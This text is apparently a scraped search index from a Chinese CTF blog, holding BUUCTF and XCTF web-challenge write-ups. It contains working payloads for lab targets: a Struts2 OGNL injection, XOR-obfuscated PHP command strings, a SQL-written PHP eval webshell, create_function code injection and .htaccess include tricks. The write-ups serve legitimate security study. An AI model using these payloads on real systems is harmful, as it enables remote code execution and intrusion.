c94943bab61cd141578a8780a9f2fe072c5ec14ca5f1833febaf7d96491216706ca0ed5428270e5220811486aa80a3f317e4c135d36ad4c9a43a4b4b6393ae5d019922ad50096489f886978781a2f05650088aeace4c0893f80d10c9d48f9204d6eef97ca0ba7279b38c8cd0b215600f48ddc7c877a059705f7d3b5e72fb3d184510daa594a11a08e9f766e6d275d6756bbd16be847adda58b52fdcd1c8866a7551a9e0def02dbab406e97a5741207d5e37cbdfc67b0363870b94341e93f66787a50f0d31606200c8aa6616ea3cb854b59a42551fdc27f3b5dc1559087804f4dc2517101c3df1d52f4ea8fab2fe5e6b06994402769b026ec18dac93dd0dd76d5ae46fb67ee8cbd137fd4b272e95cb303b75d5dfffe9b1c32846a97237170daf00fdda12784f3d8686fa6dba9c9eab644d31d2524554ce9bdb1f85c8c461ac9d28b2b0afff9af206029a82d89e6e765be6dd55937c44d7fd1bc6a979dda5947fc8ea10f48576164fc6def73ff637f8866468eb22ded7bab94a1d3ecaac5a887daa65738f7f13b51a360a7c1d0ff674c0587267061bcbfbe9773a0519cf6e3e105d215d51e5086d3fb37629b34904cdeef20fdd3a10189f156e964c1dc66f17c365d3c6ce0ab93934b60f0810e216296bb72965d82c399b6578ba6042e7b22468c0f8efd862110aafa15e6650bf6c7763799a9c73a1dc29e40e7e51fc6a1b3f25b27ce63e79a5fbbdf3249d7c24d8f3abab29bff457d16446efd6280ad39eaebda554d7e307342bd3e2448fbd11d79bc290d35c8bc341d52be880ca78b262469716545b9bc776ad208198899a56646e0c77617ffb8f83871db5a2742189c6f8dfc573033e4b6e17fac702e6a6aff22e8cfb5da851304a74ed0fa41e76cd7434f335d3d556366019987a58e8e4ae837c5c596bf778861e3f8908c56271d3116888fd99b6126b6069b5fa2c31d90078cc07a67b1ace79cc3e295ccddcf58010a0b84e0d12f9a25c95c78d1312be0d212390c724e0acd14e83b17e49a93c1df12bc085d6737bb0c00ba755f30c99ddd058b9c58777676c22b1675d6d6d37d2937a27601f9d6552b05415e6f37c69916fdda66f2ed9757e0b3247ae4fd1f0e750318824cefd1f567c2d9db321a97f991c4e863de535b3be19c5f4afb55f872951f27353822fe87c250e0ca4a347f698f5def2a50b40c9bc2a30ee0227507a89d5a2fd2b29de6a6a91ea08004830df79f46d9ba191c3e39e1c5173bb7c82ddfe2cf939f56cd87f8233e346b105a17bf0c05719e4ff4c3e32d47789010fbaa389438eaed19e781e499d7a30a5b81134635d2c1dc0b54b880f84508a4b746f97e79d1cae1f6e40a4cac6fe345f9b66e84e8407fef0cd2154538d563bf3d6653605a064fcef381f4eb69908b12b2e11780ce137ee3812595a309710b16fdab0027f32cfcf7afbe216f02c2d1988bac35a0d1017d88045c0ff5d02e1ef0f32550070498ea1d7cfc9e78b05af630da2327987b19cae389f0a0bf7a6e82a764e9343c7226c19f040c20cf42802150bd95cc023d78fd5a4e6d61fcc014b923301dd73f1befdedfbb242e5f567fa91e0e5eb606196a03a12193dd8a5e06da2462bddea8998fcb6ec3ddef22842df10d055331092babcdbdde4e9a05ccc218830251465e05ec10063fa173526e02eadf1a4365f1cb56ddc1cc991f0e9c6564a64a3049d33ea1f46b2308e01b201228bb56b887e98e6b39e652ccb577cab9cdbe74d9c64facb55ce961bacc5f77877f7ebd0165da0f7b7153b100ef6a3c465979f148656b1808083a7d865892d466ce97357ab885e5b8174301192181b10c18d3c21159581a008f118b2610f183a183ae76b95c37df1bbe00e837665a963460a8d661441a340e11a9b7ac8ddd24654c9dbbbf251d4ae6561ebf3fb20539ae Hey, password is required here. "},{"title":"XCTF简单记录","date":"2023-07-31T08:04:01.000Z","url":"/post/85812b61.html","categories":["各赛事WP"],"content":"web狗没啥参与感 WEBweb就一道题目 jwt2struts考点： 哈希长度扩展攻击 jwt伪造 structs2 s2-016 源码发现JWT_key.php 获得源码 大致浏览 就是要么我们能得到他的盐值 要么输入密码为root 但是又不容许我们输入密码为root 总之就是要让$_COOKIE[&quot;digest&quot;] === md5($salt.$username.$password)成立 直接用hashpump参考 得到之后打入 得到jwt的key为sk-he00lctf3r然后伪造登录 发现源码提示 do you know struts2? 当用户提交 age 为字符串而非整形数值时，后端用代码拼接 “‘“ + value + “‘“ 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式 官方wp是在age注入%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27printenv+FLAG%27%29.getInputStream%28%29%29%29+%2B+%27 但是我之后复现没成功 没有回显 但是我的payload是这样 可能是非预期 来源  MiscsnippingToolsCVE-2023-28303 比赛的时候找到工具了 没试 我TM。。。。  直接用工具梭哈恢复就行了 old language 太离谱了这个 龙语，游戏《上古卷轴V：天际》中出现的语言 *ctf{GIKRVZY} "},{"title":"buu刷题（page 4-2）","date":"2023-07-22T08:40:13.000Z","url":"/post/d33f9f0e.html","categories":["buuctf"],"content":"buu刷题（page 4-2） 越来越复杂 越来越吃力了 –^– 113、[HarekazeCTF2019]Avatar Uploader 1一道挺有趣的题目 登录一下 让我们上传头像 并且图片格式为png 并且大小小于256x256 ok 这道题目我其实最大的疑惑是源码怎么来的 也许只是buu没给源码？ 直接来看源码 最重要的是这两部分： 第一部分通过 finfo_file()来获取mine信息 要求我们上传的是png图片 第二部分getimagesize()来获取大小并且不只是大小还有其他图片信息 这个函数会返回一个包含图片信息的数组 并且又要求getimagesize()获取到图片信息中不能为png图片 这样才会给我们flag 所以总结一下就是要求我们 finfo_file()获取到mine为png图片 但是getimagesize()获取到图片信息又不能为png图片 所以这样很明显我们需要绕过getimagesize()也就是让$size[2] !== IMAGETYPE_PNG这个条件成立 问一下gpt 我们可以让getimagesize()函数在获取图片信息的时候让其出错 从而使得这个条件成立 成功bypass 随便找一个符合其他条件的png 图片 将除了第一行以外的其他信息全部删除生成一张png图片 这样只有文件头部是正常的getimagesize()获取不到图片的其他信息从而出错 成功！ 114、[BSidesCF 2019]SVGMagicSVG是Scalable Vector Graphics的缩写,意为可缩放向量图形。它是一种使用XML描述2D图形的图像文件格式。 也就是说SVG是XML文件 那么说到xml 立马就能想到xxe 如果我们在svg图像中插入xxe恶意代码呢 直接偷师傅的payload： 这里要注意的是： 一般我们进行xxe的时候，定义了外部实体还要通过&amp;来调用这个实体，但是这道题目不需要 只需要上传上去之后他会执行 然后再把结果反馈到png图像中 可能这就是render的魅力吧:) 这道题目flag文件不知道在哪里 /proc/self/cwd表示当前路径 /proc/self/root表示的是/根目录 115、[ISITDTU 2019]EasyPHP一道奇淫rce构造rce的题目 其实就是异或构造+无参rce 正则waf了这些 再来看看这部分： strtolower:将我们输入的内容转为小写 count_chars:返回字符串所用字符的信息 这里模式为3所以返回所有使用了的字节值组成的字符串 strlen:获取字符串长度 所以整个这一部分就是计算我们输入字符串字符类型个数 获取我们总共输入了几种字符 看了这道题的wp 主要是很麻烦 核心就是通过异或来构造webshell 这里有个小tips 一般我们构造异或payload的时候都是与%ff异或来获取字符的 一个简单的demo理解异或构造 那么问题是97^49为什么是80呢 其实是十进制先转为二进制 然后两个数的每一位二进制之间进行异或得到的数再转为十进制就是结果 可见这个结果就是十进制的80 看了这篇文章还是很不错的 里面还有通过非！来进行构造数字payload 真的tql 成功构造出数字2 然后这道题目就是会限制我们的字符类型要在13以内 就是要去找别的字符来减少payload 这点很麻烦 其次就是无参rce 构造print_r(scandir(.))来找flag文件 paylaod:((%8F%8D%96%91%8B%A0%8D)^(%ff%ff%ff%ff%ff%ff%ff))(((%8C%9C%9E%91%9B%96%8D)^(%ff%ff%ff%ff%ff%ff%ff))(%D1^%ff));但是里面的字符类型超过13了 利用已经存在的字符异或来替换减少字符类型 查找可以替换的字符 a &#x3D; c^p^r d &#x3D; s^c^t n &#x3D; i^s^t 每个替换字符再与%ff异或一下 得到： 最后构造： 发现flag文件 再构造： readfile(end(scandir(.))) 思路和上面一样 payload:((%8c%9a%9e%9b%9c%96%93%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff)^(%9b%ff%ff%ff%93%ff%ff%ff)^(%9a%ff%ff%ff%96%ff%ff%ff))(((%9a%9c%9b)^(%ff%ff%ff)^(%ff%93%ff)^(%ff%9e%ff))(((%8c%9c%9e%9c%9b%96%8c)^(%ff%ff%ff%ff%ff%ff%ff)^(%ff%ff%ff%93%ff%ff%9b)^(%ff%ff%ff%9e%ff%ff%9a))(%d1^%ff))); 参考： payload都是偷的这个大佬的qaq 116、[FireshellCTF2020]Caas一个c语言文件包含的题目 新奇 一开始以为是php环境或者python 然后搜索报错信息之后返现是c语言 payload:#include &quot;/flag&quot; 117、[N1CTF 2018]eating_cms考点：parse_url解析漏洞 首先在/register.php下申请一个账号 老套路了 然后登录 然后看了下请求的网址 很像任意文件读取url 用伪协议读一下 得到以下内容 index.php user.php info.php function.php config.php 代码审计一下没发现什么不对的 我以为是sql注入 但是看了wp 发现是我没学到的知识点 其他文件没有什么 直接来看重要的function.php 定位到： 发现存在parse_url解析漏洞 可以借助一个demo来理解 parse_url()会把//认为是相对路径 于是当我们在路径前多输入一个&#x2F;，会使这个函数失效，这样就绕过了检测 如果我们直接输入/user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg会被检测 但是在前面多加一个/成功读到了源码 利用伪协议读源码 然后得到 访问/templates/upload.html 但是是个假的上传点 随便上传一个文件之后会报错并且发现存在/upllloadddd.php 然后利用前面的伪协议获取源码 直接定位到这一行代码 发现存在文件上传名漏洞 可以修改文件名闭合命令执行 但是真正的上传点在哪呢 看了wp 由于不能让move_uploaded_file报错，文件名里不能有&#x2F;这种路径字符 所以如果我们执行命令 ls /这样 那么就会die出去 没有回显 难怪我一开始一直在这里困惑 翻别人的博客看wp真是一件美事啊:) 118、[强网杯 2019]Upload又要代码审计先留着 119、[GYCTF2020]Ez_Express一道js的原型链污染+ssti的组合题目 挺不错的 首先访问主页 他让我们用ADMIN 登录 然后存在一个源码泄露 /www.zip下到源码 放一下重要的源码： 看到了我们的老朋友 merge() 呢就肯定存在原型链污染 顺着看逻辑 首先是登陆 &#39;user&#39;:req.body.userid.toUpperCase()这里存在一个把我们名字转为大写的操作 其实考了javascript大小写特性 在js中 有一种类字符 比如admın看起来像我们平常的admin 但是他的ı字符并不是我们常用的i 但是经过这个toUpperCase()函数之后 就会变为大写的I 那么就可以bypass了 当然也会存在转小写的操作 都是一个思路 参考： 注册admın 然后登录就用ADMIN 成功登录 然后到了/action路由 req.session.user.data = clone(req.body);这一条语句用到了我们的原型链污染 那么应该污染谁呢 暂且放着 再来看/info路由 又是老朋友render 看到他就想到ssti 可以看到如果我们能控制utputFunctionName这个参数我们就可以进行ssti了 跟踪一下 竟然发现这个变量没有定义 这就很诡异了 所以我们可以在/action路由下对他进行原型链污染 然后在/info 对他进行ssti 这样就能getshell了 请求包paylaod: 这里要注意就是我们提交的payload形式一定要是json格式的 Content-Type: application/json 然后我这里是用反弹shell 访问/info 成功 120、[SUCTF 2018]MultiSQL考点：mysql预编译 复习一下旧知识 都好久了 忘了 看标题就是sql注入 首先在注册的时候就多加个&#39; 看看会怎样 一般这里可能会存在二次注入之类的 发现被转义了 作罢 点用户信息发现url不对劲 感觉这里存在sql注入 fuzz 发现过滤了union，select ，&amp;，| 那么我们一般的select查询就不要想了 然后这道题目其实考察的是堆叠注入 然后搭配预编译写🐎 有两种方式 一种是用char()写🐎 另一种是16进制搭配hex()函数写🐎 在做这道题目之前还从来没在sql注入的时候写过🐎 属于是第一次见了 首先是预编译 在很早以前 做buu题目的时候就见过预编译 首先是set @A=sql语句;prepare B from @A;execute B;格式就是如此 这里的sql语句就是我们要在mysql中写一句话木马的语句 如下格式 其实我最懵逼的就是这个路径为什么要在/favicon下 很奇怪 为什么 直接在/var/www/html就不行 看了很多wp 就是没提及这一点 之后在神の的wp中 发现是题目可以扫到一个这个目录 真夸张 御剑的字典没这个目录 如果真在比赛中做 我百分之百做不出来 第一种char()写🐎原理： 就是利用char函数 bypass 对select等字符的限制 随便写个脚本 跑一下就行了 payload: select &#39;&lt;?php eval($_POST[x]);?&gt;&#39; into outfile &#39;/var/www/html/favicon/1.php&#39;; 转成对应的ascii编码的字符 然后搭配预编译打入即可 第二种 hex()搭配十六进制写🐎payload和上面一样只不过 这里转为16进制就行了 原理： payload: 121、bestphp’s revenge啊啊啊啊 又是信息爆炸的一题 真是一题比一题炸裂 一天做一题弄明白脑子就已经炸了 一共有两个文件 index.php flag.php 看flag.php 我们需要本地访问才能拿到flag 但是我们直接通过xff修改ip获取不到 这里就很像之前做的一道题目 要通过ssrf 打才行 来分析一下index.php call_user_func()首先是一个call_user_func() 第一个参数作为回调函数执行 第二个参数作为回调函数的参数传入 但是这里一开始我在想为什么不直接通过system()当回调函数 直接进行命令执行 后来发现$_POST只能以键值 也就是A&#x3D;B的形式传入才行 只传入一个A是post不上去的 所以A&#x3D;B的形式肯定不符合call_user_func()第二个参数无果 除此之外 这个函数不仅仅只能传入函数 还可以通过数组包含类的方式执行类的方法 如下： 把第一个值当作类名，第二个值当作方法进行回调 php session反序列化机制其次是php session反序列化机制  具体可参考这个文章 这个师傅写的很详细 之前在ctfshow 刷题的时候也遇到了 session.serialize_handler是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。 一共有三种 php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 php:存储方式是，键名+竖线+经过serialize()函数序列处理的值 php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值 存储机制： php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。 当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞。 例如传入$_SESSION[&#39;name&#39;]=&#39;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&#39;; 序列化引擎使用的是php_serialize，那么储存的session文件为 而反序列化引擎如果使用的是php，就会把|作为作为key和value的分隔符。把a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;当作键名，而把O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;当作经过serialize()函数处理过的值，最后会把它进行unserialize处理，此时就构成了一次反序列化注入攻击。 SoapClient再就是到可以ssrf的类 之前刷ctfshow的题目时候就遇到曾经用过这个类 SoapClient 它可以发送http请求包 利用php原生类SoapClient中的__call方法进行SSRF 在新建一个SoapClient的类对象的时候，需要有两个参数，一个是字符串形式的wsdl，另一个是数组形式的options。而wsdl在开发中十分常见，在安全中用的比较少 ，并且这里也用不到，所以设为null就行了。 构造序列化字符串： 至于这一行$b = new SoapClient(null, array(&#39;uri&#39; =&gt; $url, &#39;location&#39; =&gt; $url)); 本题的思路： 利用回调函数覆盖session序列化引擎为php_serilaze 在代码中这样session_start(serialize_hander=php_serialize) 可以查php手册能这样修改 一开始问gpt说不能这样 着实是被误导了 构造SSRF的Soap类的序列化字符串配合序列化注入写入session文件 文件名要用phpsessid&#x3D;8位自己设置一下 利用变量覆盖漏洞，用extract()覆盖掉变量b为回调函数call_user_func，回调函数调用Soap类的未知方法，触发__call方法进行SSRF访问flag.php。把flag写入session，再把session打印出来即可。 请求包： 首先先将php序列化引擎设置为php_serialize 写入session文件 源码中session_start()反序列化使用的是php引擎 接下里我们覆盖变量b，利用call_user_func调用SoapClient类中的不存在方法，触发__call方法，执行ssrf。并获得访问flag.php的PHPSESSID。 这里的$a数组就是array(“SoapClient”,”welcome_to_the_lctf2018”) 也就是call_user_func(call_user_func(&quot;SoapClient&quot;,&quot;welcome_to_the_lctf2018&quot;)) 因为SoapClient不存在welcome_to_the_lctf2018方法 所以就调用__call魔术方法了 这样根据flag.php 就会将flag写入session 找到phpsessid 服务器可以根据PHPSESSID来识别用户session,获取保存在服务器session文件中的相关数据,如用户状态、购物车内容等。 然后将phpsessid改为保存flag的那个就可以了 那么为什么修改phpsessid就能得到flag那 我是这么理解的：我们都知道session是保存我们登录状态的识别身份的东西，我们访问flag.php以后将flag保存在session[flag]中 我们只要将我们身份改为访问flag.php那个身份就行了 然后indx.php中的var_dump($_SESSION)就会将flag输出出来 122、[安洵杯 2019]不是文件上传123、[羊城杯2020]easyphp一道关于.htaccess的题目 给了源码; 大致浏览就是当前目录下只能存在index.php 其他文件都会被删除 但是这道题目可以创建其他文件在当前目录下 真的离谱 不过写入也没用 这道题目只容许index.php解析 其他php文件代码都是原样输出 不会解析的 然后这道题目要利用.htaccess 这是一个php配置文件 那么为什么不用.user.ini呢 因为.htaccess文件作用的范围更大 它比较灵活，不需要重启服务器，也不需要管理员权限 我们可以生成一个.htaccess文件去配置文件包含 这样在每个php文件中都包含一个.htaccess文件 有点套娃的感觉 并且我们在.htaccess文件中以注释方法写上我们的恶意代码 这样就不会影响我们的.htaccess文件正常运行了 所以内容为： 但是根据源码 file被waf了 但是可以用\\来拼接上下行 我在上面也说到了 所以改为 并且 file_put_contents($filename, $content . &quot;\\nHello, world&quot;);会在后面加上没意义的内容 影响我们的.htaccess文件正常执行 所以再加一个\\转义掉\\n不让他换行 这样拼接的内容就变为\\\\nHello, world了 所以最payload形式: 其实一开始我有个问题就是 #&lt;?php phpinfo();?&gt;\\被包含在index.php中 前面不是有个#吗 #在php中也是单行注释符 为什么会执行这一行呢 ？ 其实#根本就不在php代码内容中 也就是不在php代码&lt;?php ?&gt;中 不会当作注释符 只有在&lt;?php ?&gt;里面才会被当作注释符 一下demo简单理解 124、[GXYCTF2019]BabysqliV3.0这道题目看标题以为是sql注入 但是其实预期解是phar反序列化 最重要的是代码审计 弱口令 admin&#x2F;password 看url 很奇怪 感觉存在任意文件读取 upload.php home.php 分析：代码审计 代码审计太重要了 我们先正常上传一个文件 爆出了保存路径 并且他直接显示出了我们的内容GIF89a？？？？ 但是我们的文件后缀已经被改为了txt 所以我们的php代码无法执行 看看为什么会直接输出的代码逻辑，可见我们上传文件后 会立即将文件经过处理之后输出 再来看这一部分 经典创建一个沙盒 并且注意到 name我们可控 如果我们get一个name并且不包含他正则的伪协议字符 那么就不会被他修改文件名 如果没有设置或者包含他正则的字符 我们文件名改为$sandbox.$_SESSION[&#39;user&#39;].$ext; 很符合/var/www/html/uploads/f07f07f4e21adb2dbae6c57907a6b22c/GXY7ee46e116c49b534d9932a9999994865.txt清晰明了 再来看 只要符合preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename) $file[&#39;size&#39;] &gt; 1024 那么我们上传的文件就会被移动到新的路径并且这个路径就是我们之前通过get传参的name 还剩两个魔术方法 可以看到析构函数 存在eval 执行cmd属性 但是这个题目不存在反序列化入口函数 但是这个题目有文件上传啊 太经典了 phar文件搭配phar:&#x2F;&#x2F;就可以进行反序列化 ok 思路清晰！ 非预期： 然后上传一个一句话木马 预期解:要想执行eval 那么 $this-&gt;token != $_SESSION[&#39;user&#39;] $_SESSION[&#39;user&#39;]是多少呢 我们可以随便上传一个文件来看因为路径中就会爆出 那么$_SESSION[&#39;user&#39;]=GXY845d6439be6936948e31cbfbbc90a715 然后就是很经典的phar链子构造 偷的 上传上去之后 在用phar:&#x2F;&#x2F;去访问就行了 这里就不赘述了 然后这道题目过滤里有个错误 if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i&quot;, $_GET[&#39;name&#39;])) 仔细看\\.前面有个空格 所以这道题匹配不到我们的.因而我们才能get的name中存在."},{"title":"buu刷题(page 4)","date":"2023-07-13T14:12:53.000Z","url":"/post/ec342723.html","categories":["buuctf"],"content":"buu刷题(page 4) 98、[BJDCTF2020]EzPH查看源码发现一段base32码GFXEIM3YFZYGQ4A= 特征是只有大写字母和数字 解码获得/1nD3x.php 源码如下： 首先$_SERVER[&#39;QUERY_STRING&#39;]和一个正则已经不可能让我们输入合法了，所以要想办法绕过这个$_SERVER[&#39;QUERY_STRING&#39;] $_SERVER[&#39;QUERY_STRING&#39;]不对传入的东西进行url编码，所以我们可以进行全字符url编码后传入就可以bypass。 然后是经典的换行符%0a绕过preg_match(&#39;/^aqua_is_cute$/&#39;, $_GET[&#39;debu&#39;]) &amp;&amp; $_GET[&#39;debu&#39;] !== &#39;aqua_is_cute&#39;) file_get_contents($file) !== &#39;debu_debu_aqua&#39;利用data协议写入即可 sha1()和md5一样我们传入两个数组就会报false 从而bypass $_REQUEST它包含了我们get、post和cookie传入的数组，他ban掉了数字和大小写，那这里应该怎么绕过呢。 如果get和post一样的参数名，它会优先选择post形式传入的参数的值。 所以我们可以按他的要求get传入，然后再post相同的变量名传参为数字，那么就可以bypass了 至此，我们要传入的部分为 通过url编码： 这里注意一下这里符号以及数字没有被waf所以不要一键url编码了 数字和符号原样放出即可 如果一起编码，解码的时候就会出现歧义 再来看extract()简单说就是当我们传入一个含有键值对的数组时候，他就会帮我们把键值分别提出来键为变量名，值为变量的值。 再来看$code(&#39;&#39;, $arg)这一部分，这里我们可以利用前面的extract()来改变他们的值从而利用 这里用到了create_function()匿名函数注入，之前ctfshow刷题也见到过 因此我们可以利用extract传参：flag[code]=create_function&amp;flag[arg]=;&#125;var_dump(get_defined_vars());// 获取当前所有变量数组 可以看到flag在 rea1fl4g.php 但是直接访问无结果，所以还得通过伪协议配合文件包含去读 看别人wp都是说因为禁用了include所以用require，但是我看源码没有禁include并且也用不了？？ 然后$code单双引号也不能用 既然我们是get传参的所以我们也不能用数字字母所以我们就用取反利用不可见字符来输入伪协议 最后的payload： post传入：debu=1&amp;file=1 还有一种解法是用require()去包含我们的flag文件 rea1fl4g.php 然后再用 var_dump(get_defined_vars()去读 但是这里我们的.被禁了 所以利用base64函数 进行bypass 最终的paylaod： post: file=1&amp;debu=2 当然要url编码打入 99、October 2019 Twice SQL Injectio一道根据二次注入的题目 看题目标题也知道 然后我注册了admin’ 发现他登录后显示的语句不正常输出了 怀疑就是登录名存在二次注入 然后注册admin&#39; union select database()#发现爆出了库名 然后就是联合注入和二次注入组合拳就行了 比较简单 100、[HFCTF2020]JustEscape一道没有思路的学习题目 vm的沙箱逃逸 看了网上的WP 好多都是没有分析只给了payload 大概学习了一下 首先就是要通过奇怪的构造方式获取到全局process对象，这个全局对象下我们可以执行导入child_process，然后require(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()进行命令执行了 看wp都是利用自执行函数 就是形如(function()&#123;&#125;) 或 (function()&#123;&#125;)() 的表达式 ，被定义之后就会立即执行 过滤了[&#39;for&#39;, &#39;while&#39;, &#39;process&#39;, &#39;exec&#39;, &#39;eval&#39;, &#39;constructor&#39;, &#39;prototype&#39;, &#39;Function&#39;, &#39;+&#39;, &#39;&quot;&#39;,&#39;&#39;&#39;] 然后poc都是在这里淘宝： 通过模板字符串来bypass被waf的字符 其实本质就是格式化字符串 反引号来绕过单双引号 payload1： 因为有waf所以要利用数组 看大佬wp 当对象的方法或者属性名关键字被过滤的情况下可以利用数组调用的方式绕过关键字的限制 payload2就是利用模板字符串去bypass被waf的字符 poc: payload: 就暂时这样吧，做的云里雾里的。 101、[GXYCTF2019]StrongestMind纯是考察python脚本 写个脚本爬下要求两个数字，计算，然后再post提交两个数字的结果，重复1000次。 重要的点就是 我们要记录1000次数 所以要保存上一次的状态，要保存一下session 请求的时候 session().get 或者 session().post 可以保持我们的会话状态session 并且发送不同的请求 又学到了！！ 102、[SUCTF 2018]GetShell 先文件包含将我们的文件内容读入然后检查第六位开始的内容 fuzz一下 看看哪些字符没有被waf $()_[]~;.=这些没有被waf 还有汉字 这道题目就是利用汉字按位取反来getshell的 这里有个很重要的一点 在爆破时候一定要把urlencode关了，不然提交的时候bp会将特殊的符号url编码从而使得fuzz出错 我第一次就是因为这个fuzz不全 先得到1和0 在PHP中两个空数组相互比较为true 所以值为1 那么该怎么得到字母呢 我们用汉字按位取反然后利用下标去截取我们需要的字符 这里最好选择的汉字去取反后能用的字符下标为0或者1 因为我们前面只构造出了01 可以参考p神的 这样我们就可以截取一个php的p 当然这道题目我们没必要构造出php 用短标签就行了 所以最后payload可以构造很多方式 偷的： 打入 rce即可 103、[GKCTF 2021]easycms看标题就知道是找后台 &#x2F;admin 但是这道题目是admin.php 然后登录 考察弱口令 admin&#x2F;12345就可以登录 可以看到是蝉知7.7的版本 那就直接检索这个版本的漏洞 但是这道题目buu靶场问题payload稍稍不同 导致花了好长时间一直卡在这 现在这里上传一个txt文件 然后改名为：../../../../../../../../../../../var/www/html/system/tmp/yzpc 注意这里的最后的yzpc每个人不一样 我们进入后台之后进入设计-高级直接点保存会爆出一个路径 里面每个人不一样 就是这个路径和网上许多师傅复现的路径不一样 应该是靶场问题 好多师傅都是修改为：../../../../../system/tmp/yzpc 但是这道题目要按我这种路径 之后写入恶意代码即可 还有一种就是我们上传完文件修改文件名以后在主题编辑里 编辑网站头部 直接写入php🐎即可 可以看到执行成功 104、[b01lers2020]Life on Mars这道题难点还是在于怎么找到sql注入点 考察的只是联合注入 进入网页 抓包分析 会发现有请求 注入点如图 构造/query?search=amazonis_planitia%20union%20select%201,2 发现有回显 有两列 然后就是联合注入常规操作 注到这里 发现有很多表而且都没有flag 因此感觉flag不在当前库里 再查一下所有库吧 原来在alien_code这个库里 105、[MRCTF2020]Ezaudit之前就在buu上做过这类似的 首先进网页是一个花里胡哨的略过，然后扫后台发现源码泄露/www.zip 第一部分是一个登录 第二部分是公私钥 是个密码题？？？？ 审计第一部分 我们需要知道用户名密码私钥 用户名是crispr已经给出 密码我们可以用万能钥匙去闭合 因此关键在于私钥 //$Public_key = KVQP0LdJKRaV3n9D how to get crispr&#39;s private_key???最后一句提示我们要通过公钥算出种子 再利用种子生成私钥 首先要爆破一下种子 爆破得种子1775196155 并且下面的私钥要用5.2.1到7.0.x的版本去算 不然算出来不一样 我一开始用php8算的一直算的和wp不一样 版本要正确才行 再来算私钥 得到 XuNhoueCDCGc 访问/login.html 登录即可 106、[极客大挑战 2020]Roamphp1-Welcome这题太抽象了 首先进去什么也没有，然后抓包显示405状态码 HTTP状态码 405 表示请求的方法不允许。它是在客户端发送的请求方法与服务器上所允许的方法不匹配时使用的状态码。 所以默认是get 我们尝试抓包后改为post方式 爆出了源码 很常见的套路 数组绕过就行了 然后可以看phpinfo 发现了/f1444aagggg.php 额。。但是访问啥也没有 然后就可以在这个phpinfo找到flag？？？ 不懂为啥这题放在buu的第四页 107、[WMCTF2020]Make PHP Great Again这道题目主要考察了require_once 他和require差不多 require_once 也会在包含文件时执行其中的代码并将其结果包含到主脚本中。区别在于，在包含相同文件时，require_once 会检查该文件是否已经被包含过，如果是，则不再重复包含，避免出现重复定义的错误。 php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经require_once(‘flag.php’)，已经包含的文件不可以再require_once。 源码中已经包含过了所以我们就无法再利用这个函数去包含flag文件 这里有个知识点 require_once()在对软链接的操作上存在一些缺陷，软连接层数较多会使hash匹配直接失效造成重复包含，超过20次软链接后可以绕过，外加伪协议编码一下： 然后关于&#x2F;proc&#x2F;self&#x2F;root 简单来说就是指向根目录的软链接 payload： 这个我记得什么时候在ctfshow见过 反正又学到了 108、[CSAWQual 2019]Web_Unagi这道题目目标还是很鲜明的 让我们上传文件 然后再把我们的内容展示出来 并且显示信息是xml格式的 所以我们可以上传xml文件进行xxe 一开始我上传的是: 但是无论我去掉flag system都是被waf了 看了wp才明白可以用其他编码绕过 在kali iconv -f utf8 -t utf16 1.xml&gt;2.xml iconv 是一个在 Linux 和 Unix 系统上常用的字符编码转换工具。它可以将一个字符集的文本转换为另一个字符集的文本。 这里有个坑就是在xml文件中一定要包括他本来就存在的&lt;intro&gt;&amp;xxe;&lt;/intro&gt;这个标签 不然其他标签回显flag不完整都是一般 只有在这个回显的完整的 109、[SCTF2019]Flag Shop买flag 一眼丁真 就是伪造类似于session之类的去修改自己的钱数 然后再去买flag 但是需要key 抓个包 发现感觉是jwt 然后访问&#x2F;robots.txt 爆出源码 这是用ruby写的 虽然不懂语言 但是大致能明白干了个啥 还真是 jwt 看了一下key的生成 ENV[&quot;SECRET&quot;] = SecureRandom.hex(64)这肯定我们无法伪造 然后就没思路了 看了wp 发现涉及ERB模板注入 ERB模板注入格式是&lt;%=其他%&gt; 直接来看怎样获取flag params[:变量名]这里应该就是get请求名 虽然不太懂ruby 但是大致能猜出 params[:name][0,7]我们输入的name不能超过7个字符 前面说到我们只能输入7个字符的name 除去模板注入的&lt;%=%&gt;已经占据了五个字符 我们能控制的只有两个了 这里需要用到Ruby语言的一个特性 我们可以利用$&#39;来返回正则匹配结果的右边 $&#39; 最后一次模式匹配中匹配部分之后的字符串 比如hello world 设置匹配e 那么就会返回llo world 这里就是在用环境中secret与我们输入的secret进行匹配 如果我们输入secret为空 那么$&#39;就会帮我们完整的值输出 所以payload： 避免歧义进行url编码后打入 得到了key 然后jwt伪造 打入抓包 再解码就可以得到flag了 110、[GYCTF2020]Easyphp代码审计先放着 太抽象了 大概看了一下涉及反序列化字符串逃逸 sql注入等等 之后再来填坑把。 111、[极客大挑战 2020]Greatphp 给了源码 那么最重要的就是这个等式成立 一般我们可以通过传数组 就可以bypass 但是这道题目是在类中 所以这个方法就不能用了 因此这里用到了新知识点：md5()和sha1()可以对一个类进行hash，并且会触发这个类的 __toString 